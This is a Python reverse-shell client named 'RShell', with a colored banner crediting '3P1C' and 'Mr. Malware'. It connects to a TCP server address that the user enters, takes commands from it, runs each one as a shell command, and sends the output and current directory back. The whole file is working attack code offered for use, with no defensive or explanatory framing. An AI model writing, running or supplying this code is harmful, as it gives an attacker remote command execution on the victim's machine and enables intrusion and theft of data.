#!/usr/bin/env python
# -*- coding: utf-8 -*-


__author__ = "3P1C"
__version__ = 1.0

import rban
import subprocess
import os
import socket
import time
import sys
from colorama import Back,Fore,init

os.system('clear')

print(Fore.GREEN+rban.ban())
print(Fore.RED+"Author : 3P1C\t\tTester : Mr. Malware")
print(Fore.BLUE+"Version : e1.0\t\tRShell")
print(Fore.CYAN+"---------------+ Reverse Shell +---------------\n")
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
ip = input(Fore.GREEN+"[i] Enter TCP Server Address :> ")
port = int(input(Fore.GREEN+"[i] Enter TCP Server Port :> "))
try:
    s.connect((ip,port))
    print(Fore.MAGENTA+"[i] Connected :"+ip+":"+str(port))
    init()
    ter = 'bye'
    while True:
        com = s.recv(1024)
        if len(com)>0:
            if ter.encode('utf-8') == com:
                s.close()
                break
                init()
            else:
                cmd = subprocess.Popen(com[:].decode('utf-8'),shell=True,stdout = subprocess.PIPE,stderr = subprocess.PIPE,stdin = subprocess.PIPE)
                outputb = cmd.stdout.read() + cmd.stderr.read()
                outputs = str(outputb,"utf-8")
                s.send(str.encode(outputs + "\n"+Fore.BLUE+" Working Directories :"+str(os.getcwd())+"\n"))
                init()
except:
    print(Back.RED+"\n[!] Connection Refused : Please Start The TCP Server.")

init()
